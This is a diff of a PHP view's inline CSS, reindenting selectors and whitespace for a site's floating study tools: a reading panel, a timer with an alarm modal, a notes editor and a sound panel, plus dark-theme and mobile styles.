@@ -15,15 +15,14 @@
 ?>
 
 <style>
-    
-#readingToolsRoot,
-#readingToolsRoot * {
+    #readingToolsRoot,
+    #readingToolsRoot * {
         box-sizing: border-box;
     }
 
 
-    
-#readingToolsFab {
+
+    #readingToolsFab {
         position: fixed;
         right: 24px;
         bottom: 24px;
@@ -44,15 +43,15 @@
     }
 
 
-    
-#readingToolsFab:hover {
+
+    #readingToolsFab:hover {
         transform: translateY(-3px);
         box-shadow: 0 8px 24px rgba(65, 105, 225, .38);
     }
 
 
-    
-#readingToolsPanel {
+
+    #readingToolsPanel {
         position: fixed;
         right: 24px;
         bottom: 90px;
@@ -71,15 +70,15 @@
     }
 
 
-    
-#readingToolsPanel.is-open {
+
+    #readingToolsPanel.is-open {
         display: block;
         animation: rtPanelIn .18s ease-out;
     }
 
 
-    
-@keyframes rtPanelIn {
+
+    @keyframes rtPanelIn {
         from {
             opacity: 0;
             transform: translateY(8px)
@@ -92,24 +91,24 @@
     }
 
 
-    
-#readingToolsPanel {
+
+    #readingToolsPanel {
         --rt-bg: #fff;
         --rt-text: #172033;
         --rt-border: #e5e7eb;
     }
 
 
-    
-html[data-theme="dark"] #readingToolsPanel {
+
+    html[data-theme="dark"] #readingToolsPanel {
         --rt-bg: #1b202b;
         --rt-text: #f1f5f9;
         --rt-border: #343c4c;
     }
 
 
-    
-.rt-header {
+
+    .rt-header {
         display: flex;
         align-items: center;
         justify-content: space-between;
@@ -120,15 +119,15 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-header strong {
+
+    .rt-header strong {
         font-size: 15px;
         font-weight: 800;
     }
 
 
-    
-.rt-close {
+
+    .rt-close {
         width: 30px;
         height: 30px;
         border: 0;
@@ -140,14 +139,14 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-group {
+
+    .rt-group {
         margin: 0 0 15px;
     }
 
 
-    
-.rt-label {
+
+    .rt-label {
         display: block;
         margin-bottom: 8px;
         color: var(--rt-text);
@@ -156,8 +155,8 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-muted {
+
+    .rt-muted {
         display: block;
         margin-top: 5px;
         color: var(--rt-text);
@@ -167,8 +166,8 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-button-row {
+
+    .rt-button-row {
         display: flex;
         align-items: center;
         flex-wrap: wrap;
@@ -176,9 +175,9 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-btn,
-.rt-select {
+
+    .rt-btn,
+    .rt-select {
         min-height: 34px;
         padding: 7px 10px;
         border: 1px solid var(--rt-border);
@@ -190,31 +189,31 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-btn:hover,
-.rt-btn.is-active {
+
+    .rt-btn:hover,
+    .rt-btn.is-active {
         border-color: #4169e1;
         color: #4169e1;
     }
 
 
-    
-.rt-select {
+
+    .rt-select {
         width: 100%;
         cursor: pointer;
     }
 
 
-    
-.rt-color-row {
+
+    .rt-color-row {
         display: flex;
         flex-wrap: wrap;
         gap: 9px;
     }
 
 
-    
-.rt-color {
+
+    .rt-color {
         width: 29px;
         height: 29px;
         padding: 0;
@@ -224,23 +223,23 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-color.is-active {
+
+    .rt-color.is-active {
         outline: 2px solid #4169e1;
         outline-offset: 2px;
     }
 
 
-    
-.rt-range {
+
+    .rt-range {
         width: 100%;
         accent-color: #4169e1;
         cursor: pointer;
     }
 
 
-    
-.rt-range-labels {
+
+    .rt-range-labels {
         display: flex;
         justify-content: space-between;
         color: var(--rt-text);
@@ -249,8 +248,8 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-.rt-scroll-status {
+
+    .rt-scroll-status {
         margin-top: 8px;
         padding: 8px 10px;
         border-radius: 7px;
@@ -260,48 +259,48 @@ html[data-theme="dark"] #readingToolsPanel {
     }
 
 
-    
-#rtScrollStatus.active {
+
+    #rtScrollStatus.active {
         color: #16a34a;
         font-weight: 700;
     }
 
 
-    
-/* Fullscreen reading layout: hide site navigation and let the article use the screen. */
 
-    
-html.async-reading-fullscreen,
-html.async-reading-fullscreen body {
+    /* Fullscreen reading layout: hide site navigation and let the article use the screen. */
+
+
+    html.async-reading-fullscreen,
+    html.async-reading-fullscreen body {
         width: 100% !important;
         min-height: 100% !important;
         margin: 0 !important;
     }
 
 
-    
-html.async-reading-fullscreen body {
+
+    html.async-reading-fullscreen body {
         overflow-x: hidden !important;
     }
 
 
-    
-html.async-reading-fullscreen .sidebar,
-html.async-reading-fullscreen #sidebar,
-html.async-reading-fullscreen .sidebar-container,
-html.async-reading-fullscreen .main-sidebar,
-html.async-reading-fullscreen aside.sidebar,
-html.async-reading-fullscreen .topbar,
-html.async-reading-fullscreen #topbar,
-html.async-reading-fullscreen .top-bar,
-html.async-reading-fullscreen header.topbar,
-html.async-reading-fullscreen .navbar {
+
+    html.async-reading-fullscreen .sidebar,
+    html.async-reading-fullscreen #sidebar,
+    html.async-reading-fullscreen .sidebar-container,
+    html.async-reading-fullscreen .main-sidebar,
+    html.async-reading-fullscreen aside.sidebar,
+    html.async-reading-fullscreen .topbar,
+    html.async-reading-fullscreen #topbar,
+    html.async-reading-fullscreen .top-bar,
+    html.async-reading-fullscreen header.topbar,
+    html.async-reading-fullscreen .navbar {
         display: none !important;
     }
 
 
-    
-html.async-reading-fullscreen main.main-content {
+
+    html.async-reading-fullscreen main.main-content {
         width: 100% !important;
         max-width: none !important;
         margin: 0 !important;
@@ -310,16 +309,16 @@ html.async-reading-fullscreen main.main-content {
     }
 
 
-    
-html.async-reading-fullscreen main.main-content>.content-wrapper {
+
+    html.async-reading-fullscreen main.main-content>.content-wrapper {
         width: min(1200px, calc(100% - 36px)) !important;
         max-width: 1200px !important;
         margin: 0 auto !important;
     }
 
 
-    
-#asyncFloatingTimer {
+
+    #asyncFloatingTimer {
         position: fixed;
         z-index: 100005;
         top: 110px;
@@ -339,22 +338,22 @@ html.async-reading-fullscreen main.main-content>.content-wrapper {
     }
 
 
-    
-#asyncFloatingTimer.is-visible {
+
+    #asyncFloatingTimer.is-visible {
         display: block;
     }
 
 
-    
-html[data-theme="dark"] #asyncFloatingTimer {
+
+    html[data-theme="dark"] #asyncFloatingTimer {
         background: rgba(12, 20, 42, .62);
         border-color: rgba(255, 255, 255, .18);
         color: #fff;
     }
 
 
-    
-.aft-header {
+
+    .aft-header {
         display: flex;
         align-items: center;
         justify-content: space-between;
@@ -366,22 +365,22 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aft-header:active {
+
+    .aft-header:active {
         cursor: grabbing;
     }
 
 
-    
-.aft-header strong {
+
+    .aft-header strong {
         font-size: 13px;
         font-weight: 800;
     }
 
 
-    
-#aftClose,
-#aftMinimize {
+
+    #aftClose,
+    #aftMinimize {
         border: 0;
         background: transparent;
         color: #fff;
@@ -393,47 +392,47 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#aftMinimize:hover,
-#aftClose:hover {
+
+    #aftMinimize:hover,
+    #aftClose:hover {
         background: rgba(255, 255, 255, .16);
     }
 
 
-    
-#asyncFloatingTimer .aft-header strong,
-#asyncFloatingTimer .aft-display,
-#asyncFloatingTimer #aftStatus,
-#asyncFloatingTimer .aft-inputs label {
+
+    #asyncFloatingTimer .aft-header strong,
+    #asyncFloatingTimer .aft-display,
+    #asyncFloatingTimer #aftStatus,
+    #asyncFloatingTimer .aft-inputs label {
         color: #fff !important;
     }
 
 
-    
-#asyncFloatingTimer.is-minimized {
+
+    #asyncFloatingTimer.is-minimized {
         width: auto;
         min-width: 175px;
         padding: 10px 12px;
     }
 
 
-    
-#asyncFloatingTimer.is-minimized .aft-display {
+
+    #asyncFloatingTimer.is-minimized .aft-display {
         padding: 4px 0 0;
         font-size: 25px;
     }
 
 
-    
-#asyncFloatingTimer.is-minimized .aft-inputs,
-#asyncFloatingTimer.is-minimized .aft-actions,
-#asyncFloatingTimer.is-minimized #aftStatus {
+
+    #asyncFloatingTimer.is-minimized .aft-inputs,
+    #asyncFloatingTimer.is-minimized .aft-actions,
+    #asyncFloatingTimer.is-minimized #aftStatus {
         display: none;
     }
 
 
-    
-.aft-display {
+
+    .aft-display {
         text-align: center;
         font-size: clamp(32px, 8vw, 40px);
         font-weight: 800;
@@ -444,16 +443,16 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aft-inputs {
+
+    .aft-inputs {
         display: flex;
         justify-content: center;
         gap: 12px;
     }
 
 
-    
-.aft-inputs label {
+
+    .aft-inputs label {
         display: grid;
         gap: 4px;
         font-size: 11px;
@@ -461,8 +460,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aft-inputs input {
+
+    .aft-inputs input {
         width: 75px;
         max-width: 35vw;
         padding: 7px;
@@ -475,16 +474,16 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aft-actions {
+
+    .aft-actions {
         display: flex;
         gap: 7px;
         margin-top: 11px;
     }
 
 
-    
-.aft-actions button {
+
+    .aft-actions button {
         flex: 1;
         min-height: 36px;
         padding: 7px 4px;
@@ -498,15 +497,15 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aft-actions button:first-child {
+
+    .aft-actions button:first-child {
         background: #4169e1;
         color: #fff;
     }
 
 
-    
-#aftStatus {
+
+    #aftStatus {
         display: block;
         margin-top: 9px;
         text-align: center;
@@ -514,8 +513,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#aftAlarmOverlay {
+
+    #aftAlarmOverlay {
         position: fixed;
         inset: 0;
         z-index: 100020;
@@ -529,14 +528,14 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#aftAlarmOverlay.is-visible {
+
+    #aftAlarmOverlay.is-visible {
         display: flex;
     }
 
 
-    
-#aftAlarmModal {
+
+    #aftAlarmModal {
         width: min(360px, 100%);
         padding: 25px 22px;
         text-align: center;
@@ -551,38 +550,38 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#aftAlarmModal h2,
-#aftAlarmModal p {
+
+    #aftAlarmModal h2,
+    #aftAlarmModal p {
         color: #fff;
     }
 
 
-    
-#aftAlarmModal .aft-alarm-icon {
+
+    #aftAlarmModal .aft-alarm-icon {
         font-size: 38px;
         color: #4169e1;
         margin-bottom: 8px;
     }
 
 
-    
-#aftAlarmModal h2 {
+
+    #aftAlarmModal h2 {
         margin: 0 0 7px;
         font-size: 22px;
     }
 
 
-    
-#aftAlarmModal p {
+
+    #aftAlarmModal p {
         margin: 0 0 18px;
         opacity: .75;
         font-size: 13px;
     }
 
 
-    
-#aftStopAlarm {
+
+    #aftStopAlarm {
         width: 100%;
         min-height: 44px;
         border: 0;
@@ -594,25 +593,25 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-@media(max-width:480px) {
 
-        
-#readingToolsFab {
+    @media(max-width:480px) {
+
+
+        #readingToolsFab {
             right: 16px;
             bottom: 16px
         }
 
 
-        
-#readingToolsPanel {
+
+        #readingToolsPanel {
             right: 14px;
             bottom: 80px
         }
 
 
-        
-#asyncFloatingTimer {
+
+        #asyncFloatingTimer {
             top: auto;
             right: 12px;
             bottom: 12px;
@@ -620,40 +619,40 @@ html[data-theme="dark"] #asyncFloatingTimer {
         }
 
 
-        
-#aftAlarmModal {
+
+        #aftAlarmModal {
             padding: 22px 17px;
         }
 
-    
-}
+
+    }
 
 
-    
-@media(max-width:480px) {
 
-        
-#readingToolsFab {
+    @media(max-width:480px) {
+
+
+        #readingToolsFab {
             right: 16px;
             bottom: 16px
         }
 
 
-        
-#readingToolsPanel {
+
+        #readingToolsPanel {
             right: 14px;
             bottom: 80px
         }
 
-    
-}
+
+    }
 
 
-    
-/* Quiet, theme-aware floating study tools */
 
-    
-#asyncNotesFab {
+    /* Quiet, theme-aware floating study tools */
+
+
+    #asyncNotesFab {
         position: fixed;
         right: 22px;
         z-index: 99989;
@@ -674,28 +673,28 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesFab {
+
+    #asyncNotesFab {
         bottom: 82px;
         background: var(--aux-notes-fab, rgba(13, 148, 136, .72));
     }
 
 
-    
 
 
-    
-#asyncNotesPanel .aux-head {
+
+
+    #asyncNotesPanel .aux-head {
         background: #0f8f83;
     }
 
 
-    
 
 
-    
-#asyncNotesFab:hover,
-#asyncNotesFab:focus-visible {
+
+
+    #asyncNotesFab:hover,
+    #asyncNotesFab:focus-visible {
         opacity: 1;
         transform: translateY(-2px);
         box-shadow: 0 7px 20px rgba(15, 23, 42, .2);
@@ -703,8 +702,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel {
+
+    #asyncNotesPanel {
         position: fixed;
         right: 22px;
         z-index: 100010;
@@ -721,26 +720,26 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel.is-open {
+
+    #asyncNotesPanel.is-open {
         display: flex;
         flex-direction: column;
     }
 
 
-    
-#asyncNotesPanel {
+
+    #asyncNotesPanel {
         bottom: 138px;
         width: min(470px, calc(100vw - 28px));
         height: min(620px, 76vh);
     }
 
 
-    
 
 
-    
-.aux-head {
+
+
+    .aux-head {
         display: flex;
         align-items: center;
         justify-content: space-between;
@@ -755,20 +754,20 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aux-head:active {
+
+    .aux-head:active {
         cursor: grabbing;
     }
 
 
-    
-.aux-head strong {
+
+    .aux-head strong {
         font-size: 13px;
     }
 
 
-    
-.aux-head button {
+
+    .aux-head button {
         border: 0;
         background: transparent;
         color: #fff;
@@ -778,8 +777,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-.aux-head .aux-drag-hint {
+
+    .aux-head .aux-drag-hint {
         opacity: .75;
         font-size: 10px;
         margin-left: auto;
@@ -787,8 +786,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel .notes-toolbar {
+
+    #asyncNotesPanel .notes-toolbar {
         display: flex;
         gap: 7px;
         padding: 10px 12px;
@@ -796,10 +795,10 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel select,
-#asyncNotesPanel input,
-#asyncNotesPanel button {
+
+    #asyncNotesPanel select,
+    #asyncNotesPanel input,
+    #asyncNotesPanel button {
         border: 1px solid var(--aux-border);
         border-radius: 8px;
         padding: 8px;
@@ -809,21 +808,21 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel select {
+
+    #asyncNotesPanel select {
         flex: 1;
         min-width: 0;
     }
 
 
-    
-#asyncNotesPanel .notes-toolbar button {
+
+    #asyncNotesPanel .notes-toolbar button {
         cursor: pointer;
     }
 
 
-    
-#asyncNotesPanel #asyncNoteTitle {
+
+    #asyncNotesPanel #asyncNoteTitle {
         margin: 10px 12px 0;
         width: calc(100% - 24px);
         padding: 10px;
@@ -834,8 +833,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncQuillEditor {
+
+    #asyncQuillEditor {
         flex: 1;
         min-height: 0;
         overflow: auto;
@@ -844,8 +843,8 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel .ql-toolbar.ql-snow {
+
+    #asyncNotesPanel .ql-toolbar.ql-snow {
         border-left: 0;
         border-right: 0;
         border-top: 0;
@@ -853,46 +852,46 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
-#asyncNotesPanel .ql-container.ql-snow {
+
+    #asyncNotesPanel .ql-container.ql-snow {
         border: 0;
         font-size: 14px;
     }
 
 
-    
-#asyncNotesPanel .ql-editor {
+
+    #asyncNotesPanel .ql-editor {
         color: var(--aux-editor-text);
     }
 
 
-    
-#asyncNotesPanel .ql-editor.ql-blank::before {
+
+    #asyncNotesPanel .ql-editor.ql-blank::before {
         color: var(--aux-text);
         opacity: .55;
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-stroke {
+
+    #asyncNotesPanel .ql-snow .ql-stroke {
         stroke: var(--aux-text);
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-fill {
+
+    #asyncNotesPanel .ql-snow .ql-fill {
         fill: var(--aux-text);
     }
 
 
-    
-#asyncNotesPanel .ql-snow .ql-picker {
+
+    #asyncNotesPanel .ql-snow .ql-picker {
         color: var(--aux-text);
     }
 
 
-    
-#asyncNotesPanel .notes-footer {
+
+    #asyncNotesPanel .notes-footer {
         padding: 8px 12px;
         border-top: 1px solid var(--aux-border);
         color: var(--aux-text);
@@ -904,44 +903,44 @@ html[data-theme="dark"] #asyncFloatingTimer {
     }
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
-html[data-theme="dark"] #asyncNotesPanel {
+
+
+
+
+
+
+
+
+
+
+
+
+
+    html[data-theme="dark"] #asyncNotesPanel {
         --aux-bg: rgba(25, 32, 45, .97);
         --aux-text: #edf2fa;
         --aux-border: rgba(148, 163, 184, .25);
@@ -953,61 +952,61 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-@media(max-width:480px) {
+
+    @media(max-width:480px) {
 
 
-        
-#asyncNotesFab {
+
+        #asyncNotesFab {
             right: 14px;
             width: 43px;
             height: 43px;
         }
 
 
-        
-#asyncNotesFab {
+
+        #asyncNotesFab {
             bottom: 76px;
         }
 
 
-        
 
 
-        
-#asyncNotesPanel {
+
+
+        #asyncNotesPanel {
             right: 10px;
             width: calc(100vw - 20px);
         }
 
 
-        
-#asyncNotesPanel {
+
+        #asyncNotesPanel {
             bottom: 128px;
             height: min(72vh, 600px);
         }
 
 
-        
-
-
-        
-
-
-        
-
-    
-}
 
 
 
-    
-/* ASYNC unified centered study workspace */
 
-    
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel {
+
+
+
+
+
+    }
+
+
+
+
+    /* ASYNC unified centered study workspace */
+
+
+    #readingToolsPanel,
+    #asyncNotesPanel,
+    #asyncSoundPanel {
         display: none !important;
         position: fixed !important;
         left: 50%;
@@ -1028,41 +1027,41 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#readingToolsPanel.is-open,
-#asyncNotesPanel.is-open,
-#asyncSoundPanel.is-open {
+
+    #readingToolsPanel.is-open,
+    #asyncNotesPanel.is-open,
+    #asyncSoundPanel.is-open {
         display: flex !important;
         flex-direction: column
     }
 
 
-    
-#readingToolsPanel:not(.is-open),
-#asyncNotesPanel:not(.is-open),
-#asyncSoundPanel:not(.is-open) {
+
+    #readingToolsPanel:not(.is-open),
+    #asyncNotesPanel:not(.is-open),
+    #asyncSoundPanel:not(.is-open) {
         visibility: hidden;
         pointer-events: none
     }
 
 
-    
-#readingToolsPanel.is-open,
-#asyncNotesPanel.is-open,
-#asyncSoundPanel.is-open {
+
+    #readingToolsPanel.is-open,
+    #asyncNotesPanel.is-open,
+    #asyncSoundPanel.is-open {
         visibility: visible;
         pointer-events: auto
     }
 
 
-    
-#readingToolsPanel {
+
+    #readingToolsPanel {
         padding: 16px !important
     }
 
 
-    
-#readingToolsPanel .rt-header {
+
+    #readingToolsPanel .rt-header {
         position: sticky;
         top: -16px;
         z-index: 2;
@@ -1078,22 +1077,22 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#readingToolsPanel .rt-header strong,
-#readingToolsPanel .rt-close {
+
+    #readingToolsPanel .rt-header strong,
+    #readingToolsPanel .rt-close {
         color: #fff !important
     }
 
 
-    
-#readingToolsPanel .rt-group {
+
+    #readingToolsPanel .rt-group {
         margin-bottom: 12px
     }
 
 
-    
-#readingToolsPanel .rt-btn,
-#readingToolsPanel .rt-select {
+
+    #readingToolsPanel .rt-btn,
+    #readingToolsPanel .rt-select {
         border-radius: 9px;
         background: var(--aux-control, rgba(15, 23, 42, .04));
         color: var(--aux-text, #172033);
@@ -1101,34 +1100,34 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#readingToolsPanel .rt-muted {
+
+    #readingToolsPanel .rt-muted {
         color: var(--aux-text)
     }
 
 
-    
-#asyncNotesPanel {
+
+    #asyncNotesPanel {
         height: min(590px, 76vh) !important;
         width: min(500px, calc(100vw - 28px)) !important
     }
 
 
-    
 
 
-    
-#asyncSoundPanel {
+
+
+    #asyncSoundPanel {
         width: min(390px, calc(100vw - 28px)) !important;
         padding: 0 14px 14px;
         gap: 12px
     }
 
 
-    
-#asyncNotesPanel.is-minimized,
-#asyncSoundPanel.is-minimized,
-#readingToolsPanel.is-minimized {
+
+    #asyncNotesPanel.is-minimized,
+    #asyncSoundPanel.is-minimized,
+    #readingToolsPanel.is-minimized {
         width: min(300px, calc(100vw - 28px)) !important;
         height: auto !important;
         max-height: none !important;
@@ -1136,51 +1135,51 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#asyncNotesPanel.is-minimized>:not(.aux-head),
-#asyncSoundPanel.is-minimized>:not(.aux-head),
-#readingToolsPanel.is-minimized>:not(.rt-header) {
+
+    #asyncNotesPanel.is-minimized>:not(.aux-head),
+    #asyncSoundPanel.is-minimized>:not(.aux-head),
+    #readingToolsPanel.is-minimized>:not(.rt-header) {
         display: none !important
     }
 
 
-    
-#asyncNotesPanel.is-minimized .aux-head,
-#asyncSoundPanel.is-minimized .aux-head,
-#readingToolsPanel.is-minimized .rt-header {
+
+    #asyncNotesPanel.is-minimized .aux-head,
+    #asyncSoundPanel.is-minimized .aux-head,
+    #readingToolsPanel.is-minimized .rt-header {
         margin: 0 !important;
         border-radius: 16px !important
     }
 
 
-    
-.aux-head,
-#readingToolsPanel .rt-header {
+
+    .aux-head,
+    #readingToolsPanel .rt-header {
         cursor: grab;
         touch-action: none;
         user-select: none
     }
 
 
-    
-.aux-head:active,
-#readingToolsPanel .rt-header:active {
+
+    .aux-head:active,
+    #readingToolsPanel .rt-header:active {
         cursor: grabbing
     }
 
 
-    
-.aux-window-actions,
-#readingToolsPanel .rt-window-actions {
+
+    .aux-window-actions,
+    #readingToolsPanel .rt-window-actions {
         display: flex;
         align-items: center;
         gap: 3px
     }
 
 
-    
-.aux-window-actions button,
-#readingToolsPanel .rt-window-actions button {
+
+    .aux-window-actions button,
+    #readingToolsPanel .rt-window-actions button {
         width: 29px;
         height: 29px;
         padding: 0;
@@ -1194,8 +1193,8 @@ html[data-theme="dark"] #asyncNotesPanel {
 
 
 
-    
-#asyncSoundFab {
+
+    #asyncSoundFab {
         position: fixed;
         right: 22px;
         bottom: 194px;
@@ -1216,16 +1215,16 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#asyncSoundPanel .sound-choice {
+
+    #asyncSoundPanel .sound-choice {
         display: grid;
         grid-template-columns: repeat(2, minmax(0, 1fr));
         gap: 8px
     }
 
 
-    
-#asyncSoundPanel .sound-choice button {
+
+    #asyncSoundPanel .sound-choice button {
         padding: 11px 8px;
         border: 1px solid var(--aux-border);
         border-radius: 10px;
@@ -1236,15 +1235,15 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#asyncSoundPanel .sound-choice button.active {
+
+    #asyncSoundPanel .sound-choice button.active {
         border-color: #d97706;
         background: rgba(217, 119, 6, .14)
     }
 
 
-    
-#asyncSoundPanel .sound-volume {
+
+    #asyncSoundPanel .sound-volume {
         display: flex;
         align-items: center;
         gap: 10px;
@@ -1253,22 +1252,22 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#asyncSoundPanel input[type=range] {
+
+    #asyncSoundPanel input[type=range] {
         flex: 1;
         accent-color: #d97706
     }
 
 
-    
-#asyncSoundPanel .sound-actions {
+
+    #asyncSoundPanel .sound-actions {
         display: flex;
         gap: 8px
     }
 
 
-    
-#asyncSoundPanel .sound-actions button {
+
+    #asyncSoundPanel .sound-actions button {
         flex: 1;
         padding: 10px;
         border: 0;
@@ -1279,45 +1278,45 @@ html[data-theme="dark"] #asyncNotesPanel {
     }
 
 
-    
-#asyncSoundStatus {
+
+    #asyncSoundStatus {
         font-size: 11px;
         color: var(--aux-text)
     }
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
-html[data-theme="dark"] #readingToolsPanel,
-html[data-theme="dark"] #asyncNotesPanel,
-html[data-theme="dark"] #asyncSoundPanel {
+
+
+
+
+
+
+
+
+    html[data-theme="dark"] #readingToolsPanel,
+    html[data-theme="dark"] #asyncNotesPanel,
+    html[data-theme="dark"] #asyncSoundPanel {
         --aux-glass: rgba(25, 32, 45, .93);
         --aux-control: rgba(255, 255, 255, .07)
     }
 
 
-    
-#asyncFloatingTimer {
+
+    #asyncFloatingTimer {
         left: 50%;
         top: 50%;
         right: auto;
@@ -1326,76 +1325,76 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-@media(max-width:480px) {
+
+    @media(max-width:480px) {
 
 
-        
-#asyncNotesFab,
-#asyncSoundFab {
+
+        #asyncNotesFab,
+        #asyncSoundFab {
             right: 13px;
             width: 42px;
             height: 42px
         }
 
 
-        
-#asyncNotesFab {
+
+        #asyncNotesFab {
             bottom: 72px
         }
 
 
-        
 
 
-        
-#asyncSoundFab {
+
+
+        #asyncSoundFab {
             bottom: 172px
         }
 
 
-        
-#readingToolsPanel,
-#asyncNotesPanel,
-#asyncSoundPanel {
+
+        #readingToolsPanel,
+        #asyncNotesPanel,
+        #asyncSoundPanel {
             width: calc(100vw - 18px) !important;
             max-height: 84dvh;
             border-radius: 15px !important
         }
 
 
-        
-#asyncNotesPanel {
+
+        #asyncNotesPanel {
             height: 76dvh !important
         }
 
 
-        
 
 
-        
 
 
-        
 
 
-        
-#readingToolsPanel {
+
+
+
+
+        #readingToolsPanel {
             padding: 12px !important
         }
 
-    
-}
+
+    }
 
 
 
-    
-/* Unified ASYNC tool appearance: one royal-blue glass style for every tool and launcher. */
 
-    
-#readingToolsFab,
-#asyncNotesFab,
-#asyncSoundFab {
+    /* Unified ASYNC tool appearance: one royal-blue glass style for every tool and launcher. */
+
+
+    #readingToolsFab,
+    #asyncNotesFab,
+    #asyncSoundFab {
         position: fixed !important;
         right: 22px !important;
         width: 50px !important;
@@ -1416,258 +1415,244 @@ html[data-theme="dark"] #asyncSoundPanel {
     }
 
 
-    
-#readingToolsFab {
+
+    #readingToolsFab {
         bottom: 24px !important;
         z-index: 99990
     }
 
 
-    
-#asyncNotesFab {
+
+    #asyncNotesFab {
         bottom: 82px !important
     }
 
 
-    
 
 
-    
-#asyncSoundFab {
+
+
+    #asyncSoundFab {
         bottom: 198px !important
     }
 
 
-    
-#readingToolsFab:hover,
-#asyncNotesFab:hover,
-#asyncSoundFab:hover,
-#readingToolsFab:focus-visible,
-#asyncNotesFab:focus-visible,
-#asyncSoundFab:focus-visible {
+
+    #readingToolsFab:hover,
+    #asyncNotesFab:hover,
+    #asyncSoundFab:hover,
+    #readingToolsFab:focus-visible,
+    #asyncNotesFab:focus-visible,
+    #asyncSoundFab:focus-visible {
         transform: translateY(-2px);
         box-shadow: 0 10px 25px rgba(37, 76, 180, .36) !important;
         outline: none
     }
 
 
-    
-#readingToolsPanel .rt-header,
-.aux-head,
-#asyncNotesPanel .aux-head,
-#asyncSoundPanel .aux-head {
+
+    #readingToolsPanel .rt-header,
+    .aux-head,
+    #asyncNotesPanel .aux-head,
+    #asyncSoundPanel .aux-head {
         background: linear-gradient(110deg, #4169e1, #3157c7) !important;
         color: #fff !important
     }
 
 
-    
-#asyncNotesPanel .aux-head strong,
-#asyncSoundPanel .aux-head strong,
-#readingToolsPanel .rt-header strong {
+
+    #asyncNotesPanel .aux-head strong,
+    #asyncSoundPanel .aux-head strong,
+    #readingToolsPanel .rt-header strong {
         color: #fff !important
     }
 
 
-    
-#asyncNotesPanel .aux-window-actions button,
-#asyncSoundPanel .aux-window-actions button,
-#readingToolsPanel .rt-window-actions button {
+
+    #asyncNotesPanel .aux-window-actions button,
+    #asyncSoundPanel .aux-window-actions button,
+    #readingToolsPanel .rt-window-actions button {
         background: rgba(255, 255, 255, .16) !important;
         color: #fff !important
     }
 
 
-    
-#asyncNotesPanel .aux-head,
-#asyncSoundPanel .aux-head {
+
+    #asyncNotesPanel .aux-head,
+    #asyncSoundPanel .aux-head {
         border-radius: 16px 16px 0 0
     }
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
 
 
-    
-#asyncSoundPanel .sound-actions button {
+
+
+
+
+
+
+
+
+
+    #asyncSoundPanel .sound-actions button {
         background: #4169e1 !important
     }
 
 
-    
-#asyncSoundPanel .sound-choice button.active {
+
+    #asyncSoundPanel .sound-choice button.active {
         border-color: #4169e1 !important;
         background: rgba(65, 105, 225, .14) !important
     }
 
 
-    
-#asyncSoundPanel input[type=range] {
+
+    #asyncSoundPanel input[type=range] {
         accent-color: #4169e1 !important
     }
 
 
-    
-#asyncNotesPanel .notes-toolbar button,
-#readingToolsPanel .rt-btn {
+
+    #asyncNotesPanel .notes-toolbar button,
+    #readingToolsPanel .rt-btn {
         border-radius: 9px
     }
 
 
-    
-#asyncNotesPanel .notes-toolbar button:hover,
-#readingToolsPanel .rt-btn:hover {
+
+    #asyncNotesPanel .notes-toolbar button:hover,
+    #readingToolsPanel .rt-btn:hover {
         background: #4169e1;
         color: #fff;
         border-color: #4169e1
     }
 
 
-    
